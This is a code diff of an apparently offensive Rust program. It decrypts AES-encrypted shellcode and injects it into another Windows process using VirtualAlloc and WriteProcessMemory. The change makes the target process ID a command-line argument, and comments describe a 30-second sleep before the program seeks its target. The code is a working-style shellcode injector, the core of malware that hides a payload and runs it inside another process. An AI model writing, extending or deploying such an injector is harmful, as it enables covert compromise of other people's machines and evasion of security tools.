@@ -1,4 +1,3 @@
-use std::thread::current;
 
 use libaes::Cipher;
 
@@ -23,6 +22,8 @@ impl EncryptedShellcode<'_> {
     }
 }
 
+
+
 // The current execution flow idea is as follows:
 // This program starts, it sleeps for 30 seconds.
 // After sleeping, it'll look for a specified process 
@@ -39,11 +40,27 @@ fn main() {
         iv: INITVEC
     };
     let payload = encrypted_payload.decrypt();
-    
+    /*
     let pids = enumerate_processes().unwrap();
     let current_process_pid = pids.last().unwrap();
     //let args: Vec<String> = env::args().collect();
-    let mut current_process = WindowsProcess::from_pid(*current_process_pid);
+    */
+    let args: Vec<String> = std::env::args().collect();
+
+    // Ensure at least one argument (the program name) is provided
+    if args.len() < 2 {
+        println!("Usage: {} <number>", args[0]);
+        return;
+    }
+
+    // Parse the argument into a usize
+    let target_pid: usize = match args[1].parse() {
+        Ok(num) => num,
+        Err(_) => {
+            println!("Error: Invalid input! Defaulting to 0.");
+            0
+        }
+    };    let mut current_process = WindowsProcess::from_pid(target_pid);
     // Now, technically we shouldn't need to fetch a handle, as it'll do it automatically.
     let address_start = match current_process.virtual_alloc(
         None, 
@@ -55,7 +72,7 @@ fn main() {
             println!("[+] VirtualAlloc succeeded."); 
             address
         },
-        Err(e)          => panic!("[!] VirtualAlloc error!\n-> {:#x}", e.0),
+        Err(e) => panic!("[!] VirtualAlloc error!\n-> {:#x}", e.0),
     };
     match current_process.write_process_memory(
         address_start as usize, 
